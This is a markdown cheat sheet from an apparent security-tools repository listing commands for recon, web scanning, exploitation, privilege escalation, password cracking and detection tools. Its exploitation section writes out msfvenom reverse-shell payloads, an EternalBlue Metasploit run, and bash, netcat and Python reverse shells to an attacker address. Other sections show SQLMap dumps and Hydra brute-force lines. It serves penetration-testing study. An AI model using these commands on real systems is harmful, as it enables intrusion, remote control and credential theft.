# 🧰 CyberVault Tools Reference

This page is the main catalog of the most important cybersecurity tools and command patterns in the repo.

---

## 1. Reconnaissance & OSINT

### Nmap
```bash
nmap -sn 10.0.0.0/24
nmap -sS -sV -A target.example.com
nmap -p- target.example.com
nmap -oA scan target.example.com
```

### Masscan
```bash
masscan 192.168.1.0/24 -p22,80,443 --rate=1000
masscan 10.0.0.0/8 -p0-65535 --rate=5000
```

### Subfinder / Amass
```bash
subfinder -d example.com
amass enum -d example.com
```

### theHarvester
```bash
theharvester -d example.com -b all
theharvester -d example.com -b google -f results.html
```

### Shodan
```bash
shodan init <API_KEY>
shodan search "apache"
shodan host 8.8.8.8
```

### Netcat
```bash
nc -zv target.example.com 22
nc -lvp 4444
nc target.example.com 4444
```

---

## 2. Web Security Tools

### Burp Suite
```bash
java -jar burpsuite_pro.jar
```

### OWASP ZAP
```bash
zaproxy -daemon -host 127.0.0.1 -port 8080
```

### SQLMap
```bash
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump
```

### Gobuster / Dirsearch / Feroxbuster
```bash
gobuster dir -u http://target.com -w common.txt
dirsearch.py -u http://target.com -e php,html,txt
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

### Nikto
```bash
nikto -h http://target.com
nikto -h http://target.com -ssl
```

---

## 3. Exploitation & Payloads

### Metasploit
```bash
msfconsole
search smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.10
set LHOST 10.0.0.5
set LPORT 4444
exploit
```

### Msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shell.php
```

### Reverse Shells
```bash
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
nc -e /bin/sh 10.0.0.5 4444
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## 4. Privilege Escalation

### Linux
```bash
whoami
id
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
```

### Windows
```powershell
whoami /priv
systeminfo
net user
net localgroup administrators
wmic service get name,pathname
```

### AD Tools
```bash
SharpHound.exe --CollectionMethod All
Rubeus.exe kerberoast
```

---

## 5. Password & Credential Tools

### Hashcat
```bash
hashcat -m 1000 hash.txt wordlist.txt
hashcat -m 0 hash.txt wordlist.txt
hashcat --show -m 1000 hash.txt
```

### John the Ripper
```bash
john --wordlist=wordlist.txt hashes.txt
john --show hashes.txt
```

### Hydra
```bash
hydra -l admin -P passwords.txt target.example.com ssh
hydra -l admin -P passwords.txt target.example.com http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
```

---

## 6. Post-Exploitation & Defense

### BloodHound / Mimikatz / Responder
```bash
SharpHound.exe --CollectionMethod All
mimikatz.exe
sudo responder -I eth0
```

### Suricata / Snort / Auditd
```bash
suricata -c /etc/suricata/suricata.yaml -i eth0
snort -A console -q -c /etc/snort/snort.conf -i eth0
sudo auditctl -l
```

---

## 7. Useful References

- [CheatSheets/README.md](CheatSheets/README.md)
- [Knowledge/README.md](Knowledge/README.md)
- [Scripts/README.md](Scripts/README.md)
- [MOCs/README.md](MOCs/README.md)
- [INDEX.md](INDEX.md)
- [HOME.md](HOME.md)

---

[Back to README](README.md)

